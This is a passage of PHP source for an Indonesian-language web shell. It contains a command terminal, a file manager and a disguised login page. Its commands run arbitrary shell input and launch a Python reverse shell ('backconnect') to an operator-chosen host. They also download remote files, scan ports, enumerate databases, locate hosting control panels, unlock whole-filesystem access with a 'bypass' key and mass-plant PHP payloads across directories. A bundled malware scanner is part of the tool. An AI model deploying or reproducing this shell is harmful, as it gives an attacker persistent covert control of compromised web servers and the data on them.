                    substr_count($c, "\n") + 1, str_word_count($c), strlen($c), bytes(strlen($c)));
                break;
            }
            case 'stat': {
                $t = inside_root($path_join($arg0));
                $out = sprintf("path  : %s\nsize  : %s\nperm  : %s (%s)\nowner : %s\ngroup : %s\nmtime : %s\natime : %s",
                    $t, bytes((int)@filesize($t)), perms_octal($t), perms_symbolic($t),
                    function_exists('fileowner') ? @fileowner($t) : '?',
                    function_exists('filegroup') ? @filegroup($t) : '?',
                    date('Y-m-d H:i:s', @filemtime($t)), date('Y-m-d H:i:s', @fileatime($t)));
                break;
            }
            case 'file': {
                $t = inside_root($path_join($arg0));
                $out = "$t: " . (is_dir($t) ? 'directory' : (function_exists('mime_content_type') ? (@mime_content_type($t) ?: 'unknown') : (is_file($t) ? 'file' : 'missing')));
                break;
            }
            case 'touch': {
                $t = inside_root($path_join($arg0));
                assert_not_protected($t);
                @touch($t);
                $out = "Touched: $t";
                break;
            }
            case 'mkdir': {
                $t = inside_root($path_join($arg0));
                assert_not_protected($t);
                if (!@mkdir($t, 0755, true)) err("Gagal mkdir.");
                $out = "Dibuat: $t";
                break;
            }
            case 'rm': {
                $recursive = in_array('-r', $args, true) || in_array('--recursive', $args, true) || in_array('-rf', $args, true);
                $target = $arg0;
                if (str_starts_with($target, '-')) $target = $args[1] ?? '';
                $t = inside_root($path_join($target));
                assert_not_protected($t);
                if (is_dir($t)) {
                    if (!$recursive) err("Folder wajib -r.");
                    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($t, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
                    foreach ($it as $f) $f->isDir() ? @rmdir($f->getPathname()) : @unlink($f->getPathname());
                    if (!@rmdir($t)) err("Gagal hapus folder $t");
                    $out = "Folder dihapus: $t";
                } else {
                    if (!@unlink($t)) err("Gagal hapus.");
                    $out = "File dihapus: $t";
                }
                break;
            }
            case 'cp': case 'mv': {
                $src = inside_root($path_join($arg0));
                $dst = inside_root($path_join($args[1] ?? ''));
                assert_not_protected($src);
                assert_not_protected($dst);
                if ($cmd === 'cp') {
                    if (is_dir($src)) {
                        if (!is_dir($dst)) @mkdir($dst, 0755, true);
                        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($it as $f) {
                            $rel = substr($f->getPathname(), strlen($src));
                            $to = $dst . $rel;
                            $f->isDir() ? @mkdir($to, 0755, true) : @copy($f->getPathname(), $to);
                        }
                        $out = "Folder dicopy: $src → $dst";
                    } else {
                        if (!@copy($src, $dst)) err("Gagal copy.");
                        $out = "File dicopy: $src → $dst";
                    }
                } else {
                    if (!@rename($src, $dst)) err("Gagal move.");
                    $out = "Moved: $src → $dst";
                }
                break;
            }
            case 'chmod': {
                $mode = $arg0;
                $t = inside_root($path_join($args[1] ?? ''));
                assert_not_protected($t);
                if (!preg_match('/^[0-7]{3,4}$/', $mode)) err("Mode oktal tidak valid (mis. 755).");
                if (!@chmod($t, octdec($mode))) err("Gagal chmod.");
                $out = "chmod $mode: $t";
                break;
            }

            case 'grep': {
                $pat = $arg0;
                $t = inside_root($path_join($args[1] ?? $cwd));
                $n = 0;
                $out = '';
                if (is_file($t)) {
                    foreach (file($t) as $i => $line) if (stripos($line, $pat) !== false) { $out .= ($i + 1) . ': ' . rtrim($line) . "\n"; if (++$n >= 100) break; }
                } else {
                    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($t, FilesystemIterator::SKIP_DOTS));
                    foreach ($it as $f) {
                        if (!$f->isFile() || $f->getSize() > 10485760 || $n >= 100) continue;
                        $ext = strtolower($f->getExtension());
                        if (in_array($ext, ['zip', 'gz', 'jpg', 'jpeg', 'png', 'gif', 'webp', 'mp4', 'mp3', 'exe', 'so'])) continue;
                        $fh = @fopen($f->getPathname(), 'r');
                        if (!$fh) continue;
                        $i = 0;
                        while (($line = fgets($fh)) !== false) {
                            $i++;
                            if (stripos($line, $pat) !== false) {
                                $out .= $f->getPathname() . ":" . $i . ": " . rtrim($line) . "\n";
                                if (++$n >= 100) break;
                            }
                            if ($i > 20000) break;
                        }
                        fclose($fh);
                    }
                }
                $out = $out ?: 'Tidak ketemu.';
                $out .= "\n($n match)";
                break;
            }
            case 'search': case 'fsearch': {
                $kw = $arg0;
                $t = inside_root($path_join($args[1] ?? $cwd));
                $files = 0; $hits = 0;
                $out = '';
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($t, FilesystemIterator::SKIP_DOTS));
                foreach ($it as $f) {
                    if (!$f->isFile() || $f->getSize() > 10485760 || $files >= 500 || $hits >= 100) continue;
                    $files++;
                    $ext = strtolower($f->getExtension());
                    if (in_array($ext, ['zip', 'gz', 'jpg', 'jpeg', 'png', 'gif', 'webp', 'mp4', 'mp3'])) continue;
                    $c = _r($f->getPathname());
                    if (stripos($c, $kw) !== false) {
                        $out .= "✓ " . $f->getPathname() . "\n";
                        $hits++;
                    }
                }
                $out = $out ?: "Tidak ketemu '$kw'.";
                $out .= "\n(scan $files file, $hits cocok)";
                break;
            }
            case 'replace': {
                $raw = implode(' ', $args);
                $p = explode('|', $raw);
                if (count($p) < 3) err("replace find|replace|path");
                [$find, $repl, $base] = $p;
                $t = inside_root($path_join($base));
                $count = 0; $files = 0;
                $list = is_file($t) ? [$t] : [];
                if (!$list) {
                    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($t, FilesystemIterator::SKIP_DOTS));
                    foreach ($it as $f) if ($f->isFile() && $f->getSize() < 10485760) $list[] = $f->getPathname();
                }
                foreach ($list as $fp) {
                    if ($files >= 500 || $count >= 200) break;
                    if (is_protected($fp)) continue;
                    $c = _r($fp);
                    if (stripos($c, $find) === false) continue;
                    $files++;
                    $nc = str_ireplace($find, $repl, $c, $cnt);
                    $count += $cnt;
                    @file_put_contents($fp, $nc);
                }
                $out = "Replace '$find' → '$repl': $count di $files file.";
                break;
            }

            case 'base64': {
                $t = inside_root($path_join($arg0));
                $decode = in_array('--decode', $args, true);
                $c = _r($t);
                $out = $decode ? @base64_decode($c) : base64_encode($c);
                break;
            }
            case 'hash': {
                $t = inside_root($path_join($arg0));
                $algo = strtolower($args[1] ?? 'md5');
                $algos = ['md5' => 'md5', 'sha1' => 'sha1', 'sha256' => 'sha256'];
                $fn = $algos[$algo] ?? 'md5';
                $out = "$algo: " . $fn(_r($t));
                break;
            }
            case 'encode': $out = base64_encode(implode(' ', $args)); break;
            case 'decode': $out = @base64_decode(implode(' ', $args)) ?: '(gagal decode)'; break;
            case 'rot13': $out = str_rot13(implode(' ', $args)); break;

            case 'zip': {
                $t = $path_join($arg0 ?: '');
                if (!$t) err("zip <folder/file>");
                $dst = $cwd . DIRECTORY_SEPARATOR . basename($t) . '_' . date('Ymd_His') . '.zip';
                $out = zip_make($t, $dst);
                break;
            }
            case 'extract': {
                $t = $path_join($arg0);
                $dst = $path_join($args[1] ?? ($cwd . DIRECTORY_SEPARATOR . preg_replace('/\.zip$/i', '', basename($t))));
                $out = zip_extract($t, $dst);
                break;
            }

            case 'ps': case 'process': {
                $c = PHP_OS_FAMILY === 'Windows' ? 'tasklist' : 'ps aux';
                $out = x($c);
                break;
            }
            case 'netstat': case 'network': {


                $r = '';
                if (PHP_OS_FAMILY === 'Windows') {
                    $r = @x('netstat -ano 2>nul');
                } else {
                    foreach (['netstat -tulpn', 'ss -tulpn', 'lsof -i -P -n'] as $net_cmd) {
                        $bin = explode(' ', $net_cmd)[0];
                        $which = trim((string)@x("command -v {$bin} 2>/dev/null"));
                        if ($which === '') continue;
                        $r = @x($net_cmd . ' 2>/dev/null');
                        if (trim((string)$r) !== '') break;
                    }
                }

                if (trim((string)$r) === '' && @is_readable('/proc/net/tcp')) {
                    $lines = @file('/proc/net/tcp', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [];
                    $r = "PROT LOCAL_ADDR           STATE\n";
                    $st_map = ['0A' => 'LISTEN', '01' => 'ESTABLISHED', '06' => 'TIME_WAIT', '08' => 'CLOSE'];
                    foreach (array_slice($lines, 1, 200) as $ln) {
                        $cols = preg_split('/\s+/', trim($ln));
                        if (count($cols) < 4) continue;
                        [$laddr, $raddr2, $st] = [$cols[1], $cols[2], $cols[3]];
                        $lp = hexdec(substr($laddr, strrpos($laddr, ':') + 1));
                        $state = $st_map[$st] ?? $st;
                        $ip = implode('.', array_map('hexdec', str_split(strrev(substr($laddr, 0, 8)), 2)));
                        $r .= sprintf("tcp  %-21s %s\n", "$ip:$lp", $state);
                    }
                }
                $out = trim((string)$r) !== '' ? (string)$r : '(netstat/ss/lsof tidak tersedia di server ini)';
                break;
            }
            case 'df': case 'disk': {
                $total = (float)@disk_total_space($cwd);
                $free = (float)@disk_free_space($cwd);
                $used = $total - $free;
                $out = sprintf("total: %s | used: %s (%.1f%%) | free: %s",
                    bytes((int)$total), bytes((int)$used), $total ? $used / $total * 100 : 0, bytes((int)$free));
                break;
            }
            case 'du': {
                $depth = (int)($args[1] ?? 3);
                $t = inside_root($path_join($arg0 ?: $cwd));
                $sz = 0;
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($t, FilesystemIterator::SKIP_DOTS));
                foreach ($it as $f) $sz += $f->getSize();
                $out = "$t: " . bytes($sz);
                break;
            }
            case 'uname': $out = php_uname(in_array('-a', $args, true) ? 'a' : 's') . " | PHP " . PHP_VERSION; break;
            case 'whoami': {
                $u = @get_current_user() ?: @x('whoami') ?: getenv('USERNAME') ?: getenv('USER') ?: '?';
                $out = trim((string)$u);
                break;
            }
            case 'id': $out = "uid=" . (@getmyuid()) . " gid=" . (@getmygid()) . " user=" . (@get_current_user()); break;
            case 'date': $out = date('r') . " | TZ: " . (@date_default_timezone_get()); break;
            case 'uptime': {
                $load = sys_getloadavg();
                $out = sprintf("load: %.2f %.2f %.2f | now: %s", $load[0], $load[1], $load[2], now_iso());
                break;
            }
            case 'perms': {
                $t = inside_root($path_join($arg0 ?: $cwd));
                $out = "$t: " . perms_octal($t) . " (" . perms_symbolic($t) . ")";
                break;
            }
            case 'phpinfo': {
                if (empty($_SESSION['lz_auth'])) err("phpinfo butuh login.");
                ob_start(); phpinfo(); $out = ob_get_clean();
                break;
            }
            case 'disabled': case 'disabled_functions': {
                $d = @ini_get('disable_functions') ?: '(kosong)';
                $out = "Disabled: $d\n\nSaya punya akses ke:\n";
                foreach (['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen', 'putenv', 'mail', 'curl_exec'] as $f)
                    $out .= "  " . $f . ": " . (fun_available($f) ? 'OK' : 'X') . "\n";
                break;
            }
            case 'cpanel': {
                $h = $_SERVER['HTTP_HOST'] ?? php_uname('n');
                $host = preg_replace('/^www\./', '', $h);
                $out = "Kemungkinan URL panel:\n"
                    . "  https://$host:2083 (cPanel)\n  https://$host:2087 (WHM)\n"
                    . "  https://cpanel.$host\n  https://$host/cpanel\n  https://$host:8443 (Plesk)\n"
                    . "  https://$host/adminer.php\n  https://$host:10000 (Webmin)";
                break;
            }
            case 'cron': {
                $r = @x('crontab -l 2>&1');
                $out = $r ?: '(crontab tidak tersedia/kosong)';
                $out .= "\n\nFile cron sistem:";
                foreach (['/etc/crontab', '/etc/cron.d'] as $cf) if (@is_readable($cf)) $out .= "\n  $cf ✓"; else $out .= "\n  $cf X";
                break;
            }
            case 'ports': {
                if (empty($_SESSION['lz_auth'])) err("ports butuh login.");
                $host = $arg0 ?: '127.0.0.1';
                $targets = [21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8888, 27017];
                $out = "Scan $host:\n";
                foreach ($targets as $p) {
                    $c = @fsockopen($host, $p, $errno, $errstr, 0.4);
                    $out .= sprintf("  :%-6s %s\n", $p, $c ? 'OPEN' : 'closed');
                    if ($c) fclose($c);
                }
                break;
            }
            case 'symlink': {
                $t = $path_join($arg0 ?: $cwd);
                $out = '';
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(inside_root($t), FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY);
                foreach ($it as $f) {
                    if ($f->isLink()) $out .= "LINK " . $f->getPathname() . ' → ' . @readlink($f->getPathname()) . "\n";
                    if (strlen($out) > 8000) break;
                }
                $out = $out ?: 'Tidak ada symlink di path ini.';
                break;
            }
            case 'db': {
                if (empty($_SESSION['lz_auth'])) err("db butuh login.");
                if (count($args) < 3) err("db host user pass [dbname]");
                [$host, $user, $pass] = $args;
                $dbn = $args[3] ?? '';
                $dsn = $dbn ? "mysql:host=$host;dbname=$dbn" : "mysql:host=$host";
                $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_TIMEOUT => 5]);
                $out = "Terhubung: $host\n";
                if (!$dbn) {
                    $rows = $pdo->query('SHOW DATABASES')->fetchAll(PDO::FETCH_COLUMN);
                    $out .= "Databases:\n" . implode("\n", array_map(fn($d) => "  - $d", $rows));
                } else {
                    $tables = $pdo->query('SHOW TABLES')->fetchAll(PDO::FETCH_COLUMN);
                    $out .= "Tabel (" . count($tables) . "):\n" . implode("\n", array_map(fn($t) => "  - $t", array_slice($tables, 0, 50)));
                }
                break;
            }

            case 'exec': case 'cmd': case 'sh': case 'bash': {
                if (empty($_SESSION['lz_auth'])) err("exec butuh login.");
                $full = implode(' ', $args);
                $out = x($full) ?: '(kosong / gagal)';
                break;
            }
            case 'wget': {
                if (empty($_SESSION['lz_auth'])) err("wget butuh login.");
                $url = $arg0;
                if (!filter_var($url, FILTER_VALIDATE_URL)) err("URL tidak valid.");
                if (stripos($url, 'file://') === 0) err("Skema file:// diblokir.");
                $dst = $cwd . DIRECTORY_SEPARATOR . basename(parse_url($url, PHP_URL_PATH) ?: 'download');
                $dst = inside_root($dst);
                assert_not_protected($dst);
                $ok = false;
                if (fun_available('curl_exec') && function_exists('curl_init')) {
                    $ch = curl_init($url);
                    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 60, CURLOPT_SSL_VERIFYPEER => false]);
                    $d = curl_exec($ch);
                    if ($d !== false) { $ok = @file_put_contents($dst, $d) !== false; }
                    curl_close($ch);
                }
                if (!$ok) {
                    $d = @file_get_contents($url);
                    if ($d !== false) $ok = @file_put_contents($dst, $d) !== false;
                }
                $out = $ok ? "Downloaded: $dst (" . bytes((int)@filesize($dst)) . ")" : "Download gagal.";
                break;
            }
            case 'backconnect': case 'nc': case 'netcat': {
                if (empty($_SESSION['lz_auth'])) err("backconnect butuh login.");
                $host = $arg0; $port = (int)($args[1] ?? 0);
                if (!$host || !$port) err("backconnect host port");
                $code = "import socket,subprocess,os;s=socket.socket();s.connect(('$host',$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])";
                $py = PHP_OS_FAMILY === 'Windows' ? 'python' : 'python3';
                $out = x("echo " . escapeshellarg($code) . " | $py 2>&1 &") ?: "Backconnect diluncurkan → $host:$port (cek listener Anda).";
                break;
            }

            case 'baseline': $out = cmd_baseline($GLOBALS['SHELL_DIR']); break;
            case 'audit': $out = cmd_audit($GLOBALS['SHELL_DIR']); break;
            case 'shellcheck': $out = cmd_shellcheck(); break;

            case 'bypass': {
                if (empty($arg0)) err("bypass <key>");
                if (!hash_equals((string)$GLOBALS['BYPASS_KEY'], (string)$arg0) && !@password_verify((string)$arg0, $stored_hash)) err("Kunci bypass salah.");
                global $F_STATE;
                _wj(__DIR__ . "/$F_STATE", ['bypass' => true, 'at' => now_iso(), 'by' => client_ip()]);


                $_SESSION['root_bypass'] = true;
                $drive = PHP_OS_FAMILY === 'Windows' ? 'C:\\' : '/';
                $out = "bypass: ROOT BYPASS ENABLED — Full system access granted\n"
                     . "Root: $drive (seluruh filesystem)\n"
                     . "Shell protection removed (shell can now be edited/deleted).\n"
                     . "Jangan lupa 'unbypass <key>' setelah selesai.";
                break;
            }
            case 'unbypass': {
                if (empty($arg0)) err("unbypass <key>");
                if (!hash_equals((string)$GLOBALS['BYPASS_KEY'], (string)$arg0) && !@password_verify((string)$arg0, $stored_hash)) err("Kunci salah.");
                global $F_STATE;
                _wj(__DIR__ . "/$F_STATE", ['bypass' => false, 'at' => now_iso(), 'by' => client_ip()]);
                $_SESSION['root_bypass'] = false;
                unset($_SESSION['root_bypass']);
                $out = "bypass: ROOT BYPASS DISABLED — proteksi diaktifkan kembali ✓\nRoot kembali dibatasi ke docroot.";
                break;
            }

            case 'massupload': case 'uploader': {
                if (empty($_SESSION['lz_auth'])) err("massupload butuh login.");
                $base = inside_root($path_join($arg0 ?: detect_root()));
                if (!is_dir($base)) err("Base dir tidak ada: $base");
                if (empty($GLOBALS['_mass_upload_payload'])) {
                    $out = "massupload <base_dir> [count] — gunakan panel Uploader (tab TOOLS) untuk pilih file,\n"
                         . "atau upload dulu file sumber via panel upload, lalu: massupload <dir> <file.php> [count]";

                    $src = $args[1] ?? '';
                    if ($src) {
                        $sf = inside_root($path_join($src));
                        if (!is_file($sf)) err("File sumber tidak ada: $sf");
                        $GLOBALS['_mass_upload_payload'] = _r($sf);
                    }
                }
                if (!empty($GLOBALS['_mass_upload_payload'])) {
                    $count = max(1, min(50, (int)($args[2] ?? 15)));
                    $res = mass_upload_to_folders($GLOBALS['_mass_upload_payload'], basename($args[1] ?? 'payload.php'), $base, $count);
                    $out = "MASS UPLOAD SELESAI:\n" . $res;
                }
                break;
            }

            case 'cleaner': case 'malware': case 'scanmalware': {

                $base = inside_root($path_join($arg0 ?: $GLOBALS['SHELL_DIR']));
                $deep = in_array('--deep', $args, true);
                if (!is_dir($base)) err("Dir tidak ada: $base");
                $res = malware_scan($base, $deep);
                $out = "MALWARE SCAN " . ($deep ? '(DEEP) ' : '') . now_iso() . "\n"
                     . str_repeat('─', 40) . "\n"
                     . " scanned : {$res['scanned']} file\n"
                     . " suspicious: " . count($res['suspicious']) . "\n\n";
                foreach (array_slice($res['suspicious'], 0, 40) as $s) {
                    $out .= sprintf("  [%3d] %s\n       match: %s\n", $s['score'], $s['file'], implode(', ', $s['hits']));
                }
                if (count($res['suspicious']) > 40) $out .= "  …+" . (count($res['suspicious']) - 40) . " lainnya\n";
                $out .= "\nQuarantine: gunakan 'quarantine <file>' per file, atau panel Cleaner (tab TOOLS).";
                break;
            }
            case 'quarantine': {
                if (empty($arg0)) err("quarantine <file>");
                $f = inside_root($path_join($arg0));
                if (!is_file($f)) err("File tidak ada.");
                $qdir = $GLOBALS['SHELL_DIR'] . '/.lzsh_quarantine';
                if (!is_dir($qdir)) @mkdir($qdir, 0755, true);
                $dst = $qdir . '/' . basename($f) . '.' . time() . '.quarantined';
                if (!@rename($f, $dst)) err("Gagal memindahkan (permission?).");
                @file_put_contents($qdir . '/manifest.log', now_iso() . " | $f → $dst\n", FILE_APPEND);
                $out = "Dikarantina ✓\n  asal: $f\n  ke  : $dst";
                break;
            }
            case 'clear': $out = '__CLEAR__'; break;
            case 'logout': $out = '__LOGOUT__'; break;
            case 'seclog': case 'clearlogs': $out = "(dinonaktifkan di v2 — hanya untuk audit manual)"; break;
            case 'echo': $out = implode(' ', $args); break;
            default: $out = "Perintah tidak dikenal: '$cmd'. Ketik 'help'.";
        }
    } catch (Throwable $e) {
        $out = "ERROR: " . $e->getMessage();
    }
    return [(string)$out, $cwd];
}


$is_ajax = ($_SERVER['HTTP_X_REQUESTED_WITH'] ?? '') === 'XMLHttpRequest'
    || ($_GET['ajax'] ?? '') === '1';
if ($is_ajax && $LOGGED_IN) {

    $act = $_POST['act'] ?? $_GET['act'] ?? '';
    $stream_acts = ($act === 'download' || ($act === 'read' && ($_GET['raw'] ?? '') === '1'));
    if (!$stream_acts) header('Content-Type: application/json; charset=utf-8');
    $r = ['ok' => true, 'out' => '', 'cwd' => ''];
    try {
        if (!csrf_ok()) err('CSRF token tidak valid — muat ulang halaman.');

        $read_only_ops = ['term', 'list', 'read', 'download'];
        if ($ACCESS === 'read' && !in_array($act, $read_only_ops, true))
            err('Mode read-only: aksi tulis diblokir untuk IP Anda.');

        $danger_terms = ['exec', 'cmd', 'sh', 'bash', 'wget', 'backconnect', 'nc', 'netcat', 'db', 'ports', 'phpinfo'];
        if ($act === 'term') {
            $first = strtolower(trim(explode(' ', trim((string)($_POST['input'] ?? '')))[0] ?? ''));
            if (in_array($first, $danger_terms, true) && empty($_SESSION['lz_auth']))
                err('Perintah ini butuh login.');
        }
        switch ($act) {
            case 'term': {
                $in = (string)($_POST['input'] ?? '');
                $cwd = (string)($_POST['cwd'] ?? $GLOBALS['SHELL_DIR']);
                if (!is_dir($cwd)) $cwd = $GLOBALS['SHELL_DIR'];
                [$out, $cwd] = run_terminal($in, $cwd);
                $_SESSION['cwd'] = $cwd;
                if ($out === '__CLEAR__') { $r['clear'] = true; $out = ''; }
                elseif ($out === '__LOGOUT__') { $r['logout'] = true; $out = ''; }
                $r['out'] = $out;
                $r['cwd'] = $cwd;
                break;
            }
            case 'list': {
                $dir = inside_root((string)($_POST['dir'] ?? detect_root()));
                if (!is_dir($dir)) err('Bukan direktori.');
                $items = [];
                foreach (new DirectoryIterator($dir) as $f) {
                    if ($f->isDot()) continue;
                    $items[] = [
                        'name' => $f->getFilename(),
                        'isdir' => $f->isDir(),
                        'size' => $f->isDir() ? 0 : $f->getSize(),
                        'mtime' => date('Y-m-d H:i', $f->getMTime()),
                        'perm' => perms_octal($f->getPathname()),
                        'protected' => is_protected($f->getPathname()),
                    ];
                }
                usort($items, fn($a, $b) => $b['isdir'] <=> $a['isdir'] ?: strcasecmp($a['name'], $b['name']));
                $r['items'] = $items;
                $r['dir'] = $dir;
                $r['parent'] = dirname($dir);
                $r['bypass'] = bypass_active();
                break;
            }
            case 'read': {
                $f = inside_root((string)($_POST['path'] ?? $_GET['path'] ?? ''));
                if (!is_file($f)) err('File tidak ada.');

                if (($_GET['raw'] ?? '') === '1') {
                    if (!csrf_ok()) err('CSRF tidak valid.');
                    $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
                    $mime = ['jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg', 'png' => 'image/png',
                             'gif' => 'image/gif', 'webp' => 'image/webp', 'svg' => 'image/svg+xml',
                             'ico' => 'image/x-icon', 'bmp' => 'image/bmp'][$ext] ?? 'application/octet-stream';
                    header('Content-Type: ' . $mime);
                    header('Content-Length: ' . @filesize($f));
                    readfile($f);
                    exit;
                }
                $size = (int)@filesize($f);
                $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
                $img = in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'ico', 'bmp']);
                $max_preview = 512 * 1024;
                $r['type'] = $img ? 'image' : ($size > $max_preview ? 'large' : 'text');
                $r['content'] = $img ? '' : substr(_r($f), 0, $max_preview);
                $r['size'] = $size;
                $r['name'] = basename($f);
                $r['path'] = $f;
                break;
            }
            case 'save': {
                if ($ACCESS === 'read') err('Mode read-only.');
                $f = inside_root((string)($_POST['path'] ?? ''));
                assert_not_protected($f, true);
                $c = (string)($_POST['content'] ?? '');
                if (@file_put_contents($f, $c) === false) err('Gagal menyimpan (permission?).');
                $r['out'] = 'Tersimpan ✓ ' . now_iso();
                break;
            }
            case 'upload': {
                if ($ACCESS === 'read') err('Mode read-only.');
                if (empty($_FILES['files'])) err('Tidak ada file.');
                $dir = inside_root((string)($_POST['dir'] ?? detect_root()));
                $blocked = ['php', 'phtml', 'phar', 'htaccess', 'ini', 'cgi', 'pl'];
                $done = 0; $msgs = [];
                foreach ($_FILES['files']['name'] as $i => $name) {
                    $tmp = $_FILES['tmp_name'][$i];
                    $errC = $_FILES['error'][$i];
                    $size = $_FILES['size'][$i];
                    if ($errC !== UPLOAD_ERR_OK) { $msgs[] = "$name: upload error $errC"; continue; }
                    if ($size > 10485760) { $msgs[] = "$name: >10MB"; continue; }
                    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
                    $allow = !in_array($ext, $blocked, true) || bypass_active();
                    if (!$allow) { $msgs[] = "$name: .$ext diblokir (butuh bypass)"; continue; }
                    $dst = $dir . DIRECTORY_SEPARATOR . basename($name);
                    assert_not_protected($dst, true);
                    if (@move_uploaded_file($tmp, $dst)) $done++;
                    else $msgs[] = "$name: gagal pindah";
                }
                $r['out'] = "Uploaded $done file." . ($msgs ? "\n" . implode("\n", $msgs) : '');
                break;
            }

            case 'massupload': {
                if ($ACCESS === 'read') err('Mode read-only.');
                if (empty($_FILES['file'])) err('Tidak ada file sumber.');
                $base = inside_root((string)($_POST['base'] ?? detect_root()));
                $count = max(1, min(50, (int)($_POST['count'] ?? 15)));
                $tmp = $_FILES['file']['tmp_name'];
                if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) err('Upload error.');
                if ($_FILES['file']['size'] > 10485760) err('>10MB');
                $payload = @file_get_contents($tmp);
                if ($payload === false) err('Gagal baca file.');
                $r['out'] = "MASS UPLOAD → $base ($count target)\n" . mass_upload_to_folders($payload, basename((string)$_FILES['file']['name']), $base, $count);
                break;
            }

            case 'cleaner': {
                $base = inside_root((string)($_POST['dir'] ?? $GLOBALS['SHELL_DIR']));
                $deep = ($_POST['deep'] ?? '') === '1';
                $res = malware_scan($base, $deep);
                $lines = ["MALWARE SCAN " . ($deep ? '(DEEP) ' : '') . now_iso(), str_repeat('─', 40),
                          " scanned: {$res['scanned']}", " suspicious: " . count($res['suspicious']), ''];
                foreach (array_slice($res['suspicious'], 0, 60) as $s)
                    $lines[] = sprintf("  [%3d] %s  (%s)", $s['score'], $s['file'], implode(',', $s['hits']));
                if (count($res['suspicious']) > 60) $lines[] = '  …+' . (count($res['suspicious']) - 60) . ' lagi';
                $r['out'] = implode("\n", $lines);
                break;
            }
            case 'action': {
                if ($ACCESS === 'read') err('Mode read-only.');
                $op = (string)($_POST['op'] ?? '');
                $paths = (array)($_POST['paths'] ?? []);
                $outs = [];
                foreach ($paths as $p) {
                    $p = (string)$p;
                    try {
                        switch ($op) {
                            case 'delete': {
                                $t = inside_root($p);
                                assert_not_protected($t, true);
                                if (is_dir($t)) {
                                    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($t, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
                                    foreach ($it as $f) $f->isDir() ? @rmdir($f->getPathname()) : @unlink($f->getPathname());
                                    if (!@rmdir($t)) err('gagal rmdir');
                                } else {
                                    if (!@unlink($t)) err('gagal unlink');
                                }
                                $outs[] = "hapus ✓ $p";
                                break;
                            }
                            case 'chmod': {
                                $mode = (string)($_POST['mode'] ?? '644');
                                if (!preg_match('/^[0-7]{3,4}$/', $mode)) err('mode oktal tidak valid');
                                $t = inside_root($p);
                                assert_not_protected($t, true);
                                if (!@chmod($t, octdec($mode))) err('gagal chmod');
                                $outs[] = "chmod $mode ✓ $p";
                                break;
                            }
                            case 'rename': {
                                $new = basename((string)($_POST['newname'] ?? ''));
                                if ($new === '' || $new === '.' || $new === '..') err('nama baru tidak valid');
                                $t = inside_root($p);
                                assert_not_protected($t, true);
                                $dst = dirname($t) . DIRECTORY_SEPARATOR . $new;
                                if (!@rename($t, $dst)) err('gagal rename');
                                $outs[] = "rename ✓ $p → $new";
                                break;
                            }
                            case 'zip': {
                                $dst = dirname($p) . DIRECTORY_SEPARATOR . basename($p) . '_' . date('Ymd_His') . '.zip';
                                $outs[] = zip_make($p, $dst);
                                break;
                            }
                            case 'extract': {
                                $outs[] = zip_extract($p, dirname($p) . DIRECTORY_SEPARATOR . preg_replace('/\.zip$/i', '', basename($p)));
                                break;
                            }
                            case 'touch': {
                                $t = inside_root($p);
                                assert_not_protected($t, true);
                                @touch($t);
                                $outs[] = "touch ✓ $p";
                                break;
                            }
                            case 'mkdir': {
                                $t = inside_root($p);
                                assert_not_protected($t, true);
                                if (!@mkdir($t, 0755, true)) err('gagal mkdir');
                                $outs[] = "mkdir ✓ $p";
                                break;
                            }
                            default: err("op tidak dikenal: $op");
                        }
                    } catch (Throwable $e) {
                        $outs[] = "X $p: " . $e->getMessage();
                    }
                }
                $r['out'] = implode("\n", $outs);
                break;
            }
            case 'download': {
                $f = inside_root((string)($_GET['path'] ?? $_POST['path'] ?? ''));
                if (!is_file($f)) err('File tidak ada.');

                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($f) . '"');
                header('Content-Length: ' . @filesize($f));
                header('Cache-Control: no-store');
                @ob_end_flush();
                readfile($f);
                exit;
            }
            default: err("aksi tidak dikenal: $act");
        }
    } catch (Throwable $e) {
        http_response_code(200);
        $r['ok'] = false;
        $r['out'] = 'ERROR: ' . $e->getMessage();
    }
    echo json_encode($r, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}


if (!$LOGGED_IN) {
    $locked = login_locked();
    ?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>·</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0608;color:#e8dcd8;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
body::before{content:'';position:absolute;inset:0;background:
 linear-gradient(rgba(255,45,77,.03) 1px,transparent 1px),
 linear-gradient(90deg,rgba(255,45,77,.03) 1px,transparent 1px);
 background-size:34px 34px;pointer-events:none}
body::after{content:'';position:absolute;inset:0;background:
